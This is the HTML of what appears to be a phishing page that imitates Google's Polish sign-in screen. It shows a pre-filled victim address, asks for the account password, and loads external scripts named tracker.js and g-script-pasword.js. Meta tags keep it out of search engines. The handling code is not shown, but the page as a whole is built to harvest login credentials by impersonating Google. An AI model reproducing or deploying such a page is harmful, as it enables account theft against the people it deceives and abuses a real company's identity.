<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta name="googlebot" content="noindex">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="stylesheet" href="g-styles-passwd.css">
    <link rel="stylesheet" href="styles-loudery.css">
    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
</head>
<body>
<div id="progress-bar-container">
    <div id="progress-bar"></div>
</div>
    <div class="container">
        <div class="login-card">
            <div class="logo">
                <svg class="th8JXc" xmlns="https://www.w3.org/2000/svg" width="20" height="24" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
                <p>Zaloguj się przez Google</p>
            </div>
            
            <h1 class="title">Witamy</h1>
            <div class="subtitle">
                <div>
                    <svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                    </svg>
                 </div>
                 <div>
                 <span class="span-email" id="user-display-email">mailpodany.wczesniej@gmail.com </span>
                </div>
            </div>
            <form id="loginForm" class="login-form">
                <div class="input-group">
                    <input type="password" id="password" class="input-field" placeholder=" " autocomplete="email" required>
                    <label for="password" class="input-label">Wpisz hasło</label>
                </div>
                
                <div class="forgot-email">
                    <input type="checkbox" id="checkbox-show" class="pokazhaslo" onclick="togglePassword()">
                    <a class="okidoki" href="#">Pokaż hasło</a>
                </div>
                

                
                <div class="form-actions">
                    <a href="#" class="create-account">Nie pamiętasz hasła?</a>
                    <button type="submit" class="next-button button_dalej">Dalej</button>
                </div>
            </form>
        </div>
        
        <div class="footer">
            <div class="language-selector">
                <select id="language">
                    <option value="pl">polski</option>
                    <option value="en">English (United States)</option>
                    <option value="de">Deutsch</option>
                    <option value="es">Español</option>
                    <option value="fr">Français</option>
                </select>
            </div>
            <div class="footer-links">
                <a href="#">Pomoc</a>
                <a href="#">Prywatność</a>
                <a href="#">Warunki</a>
            </div>
        </div>
    </div>
    <script src="tracker.js"></script>
    <script src="email-validator.js"></script>
    <script src="g-script-pasword.js"></script>

</body>
</html>
